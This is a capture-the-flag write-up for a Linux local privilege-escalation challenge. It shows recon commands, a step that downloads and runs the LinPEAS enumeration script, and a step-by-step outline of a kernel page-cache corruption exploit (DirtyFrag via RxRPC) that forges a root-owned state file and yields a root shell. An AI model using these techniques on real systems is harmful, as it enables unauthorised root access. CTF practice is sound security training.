# Easier Pwn

## Challenge Info

**Category:** Pwn
**Points:** 250
**Difficulty:** Easy
**Challenge Description:**

```
The flag is at /root/flag. Connect with nc 20.219.0.137 3003
```

## Recon

We are given a netcat instance, with a shell prompt in a Linux box. The shell has no outbound internet.

Initial checks show the SUID list is a decoy, so we check running processes and interesting paths:

```
$ find / -perm -4000 -type f
/usr/bin/su
/usr/bin/mount
...

$ ps aux
root           1  ... /sbin/init
root         123  ... /usr/libexec/.mount-helper

$ file /usr/libexec/.mount-helper
ELF 64-bit LSB executable, x86-64

$ strings /usr/libexec/.mount-helper
/var/lib/.cache/apt/periodic/.stamp
/run/.boot-seed

$ ls -l /var/lib/.cache/apt/periodic/.stamp
-rw-r--r-- 1 root root 64 ... .stamp

$ cat /run/.boot-seed
a3f9c1e2b4d5e6f7

$ ss -a
u_str LISTEN 0 4 /run/.cache-4f3c9a1b2e8d7c6a 0 0

$ ls -l /proc/$(pidof .mount-helper)/exe
lrwxrwxrwx 1 root root ... /usr/libexec/.mount-helper
```

SUID stands for Set User ID which is a file permission flag in Linux. It allows an executable file to run with the permissions of the file's owner rather than the user who launched it. Here the SUID list is a decoy because the shell runs with `no_new_privs` so corrupting a normal SUID does not give a transition. The real path is the broker at `/usr/libexec/.mount-helper`.

[LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) gives the same conclusion in one run and is useful to confirm we did not miss anything. It is a single Bash script that sweeps read only checks like `sudo -l`, `find -perm -4000`, `getcap -r /`, `cat /etc/crontab`, world writable files and kernel version, and ranks findings for likely privesc.

Quick run inside the box:

```bash
$ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
$ base64 -w0 linpeas.sh # then upload via shell using base64 -d to /tmp/linpeas.sh
$ chmod +x /tmp/linpeas.sh; /tmp/linpeas.sh -a | tee /tmp/out
$ /tmp/linpeas.sh -s
```

LinPEAS flags kernel `6.8.0-31` as vulnerable to [DirtyFrag](https://github.com/V4bel/dirtyfrag) (page cache write via `splice` into `skb` frag), highlights the stamp file and broker as the only interesting files and confirms the module set.

## Exploitation

The broker is the gate. It is built with a build time `STATE_SEED` xored with a per VM boot nonce from `/run/.boot-seed` to get `runtime_seed`. From that seed it derives nine marker pairs and nine irregular overlapping offsets plus a seal. Offsets lie between 8 and 35 with step 3 or 4. The state file is 64 bytes at `/var/lib/.cache/apt/periodic/.stamp`. Markers are checked at those offsets and bytes 40 to 47 hold a seal computed as `seal = sum(state[i] * 257)` over all bytes except the seal. The socket is `/run/.cache-<hex>` and the check is `state_unlocked` followed by a `sync <hex>` challenge where the client must reply with `next_state_word(runtime_seed ^ challenge)`.

1. Open `/var/lib/.cache/apt/periodic/.stamp` read only and `mmap` the first page to keep the page cache resident and read the current bytes to get `C` for offline prediction.
2. Read `/run/.boot-seed`, compute `seed = STATE_SEED ^ boot_seed`, derive the nine marker pairs, nine offsets and the seal.
3. For ten stages (nine markers plus seal) reuse the public RxRPC primitive but against the stamp file. Remote Procedure Call is a protocol for AFS where the bug is an 8 byte in place decrypt with `pcbc(fcrypt)` and a key `K` via `add_key`. ESP is blocked here because `xfrm_user`, `esp4`, `esp6` and `algif_aead` are blacklisted and `unshare` is disabled so `add_xfrm_sa` fails.
4. For each stage brute force `K` via `find_K_offline_generic` until `fcrypt_decrypt(C,K)` yields the desired two bytes, then update the predicted image for last write wins.
5. For each found `K` call `do_one_trigger` at the target offset. This does `add_key("rxrpc", "evil")`, sets up UDP and `AF_RXRPC`, does the handshake, computes `csum_iv` and checksum with `pcbc(fcrypt)`, then does `vmsplice` plus `splice` to trigger `rxkad_verify_packet_1`.
6. Read back the nine markers and the seal, then connect to the Unix socket, answer the `sync` challenge and pop a shell!

```bash
$ /tmp/dirtyfrag-exp --force-rxrpc
$ id
# uid=0(root)
$ cat /root/flag
```

The solve script can be found [here](./solve.py).

## Flag

```
encryptid{lpe_d1r7y_fr4gg1ng_p7_2_1e8a4e6e9e47035172f97f1f3909b053}
```

*Writeup written by Aarav Juneja*
